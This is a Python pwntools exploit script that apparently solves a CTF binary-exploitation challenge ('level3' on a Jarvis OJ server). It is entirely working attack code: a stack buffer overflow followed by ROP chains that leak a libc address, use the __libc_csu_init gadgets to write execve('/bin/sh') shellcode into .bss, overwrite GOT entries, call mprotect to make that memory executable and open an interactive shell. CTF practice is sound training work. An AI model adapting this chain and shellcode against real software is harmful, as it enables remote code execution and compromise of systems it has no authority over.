from pwn import *
context.log_level = 'debug'
elf = ELF('./level3')


s = remote('pwn2.jarvisoj.com', 9884)
libc = ELF('./libc-2.19.so')

rop = ROP(elf)
rdi = rop.rdi[0]
rsi_r15 = rop.rsi[0]

s.recvuntil('Input:\n')

payload = 'A' * 0x80+'B'*8
payload += p64(rdi)
payload += p64(1)
payload += p64(rsi_r15)
payload += p64(elf.got['read'])
payload += p64(0)
payload += p64(elf.symbols['write'])
payload += p64(elf.symbols['vulnerable_function'])  #leak read address

s.send(payload)

read_addr = u64(s.recv()[:8])
s.recvuntil('Input:\n')

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
csu_start = 0x00000000004006aa
csu_second = 0x0000000000400690

payload = 'A' * 0x80+'B'*8
payload += p64(csu_start)
payload += p64(0)
payload += p64(1)
payload += p64(elf.got['read'])
payload += p64(len(shellcode) + 1)
payload += p64(elf.bss())
payload += p64(0)
payload += p64(csu_second)
payload += 'C' * (7 * 8)
payload += p64(elf.symbols['vulnerable_function'])   #write shellode to bss

s.send(payload)
s.send(shellcode + '\0')
s.recvuntil('Input:\n')


mprotect_addr = read_addr - libc.symbols['read'] + libc.symbols['mprotect']  #calc mprotect address


payload = 'A' * 0x80+'B'*8
payload += p64(csu_start)
payload += p64(0)
payload += p64(1)
payload += p64(elf.got['read'])
payload += p64(8)
payload += p64(elf.got['__gmon_start__'])
payload += p64(0)
payload += p64(csu_second)
payload += 'C' * (7 * 8)
payload += p64(elf.symbols['vulnerable_function'])     #writeover got table    mprotect -> __gmon_start__

s.send(payload)
s.send(p64(mprotect_addr))
s.recvuntil('Input:\n')



payload = 'A' * 0x80+'B'*8
payload += p64(csu_start)
payload += p64(0)
payload += p64(1)
payload += p64(elf.got['read'])
payload += p64(8)
payload += p64(elf.got['__libc_start_main'])
payload += p64(0)
payload += p64(csu_second)
payload += 'C' * (7 * 8)
payload += p64(elf.symbols['vulnerable_function'])      #writeover got table 	bss() /shellcode/  -> __libc_start_main

s.send(payload)
s.send(p64(elf.bss()))
s.recvuntil('Input:\n')

payload = 'A' * 0x80+'B'*8
payload += p64(csu_start)
payload += p64(0)
payload += p64(1)
payload += p64(elf.got['__gmon_start__'])
payload += p64(7)
payload += p64(0x1000)
payload += p64(0x00600000)
payload += p64(csu_second)
payload += 'C' * (7 * 8)
payload += p64(elf.symbols['vulnerable_function'])      #call mprotect to set 0x600000 to rwx    shellcode can be execute


s.send(payload)
s.recvuntil('Input:\n')


payload = 'A' * 0x80+'B'*8
payload += p64(csu_start)
payload += p64(0)
payload += p64(1)
payload += p64(elf.got['__libc_start_main'])
payload += p64(0)
payload += p64(0)
payload += p64(0)
payload += p64(csu_second)
payload += p64(elf.symbols['vulnerable_function'])

s.send(payload)

s.interactive()
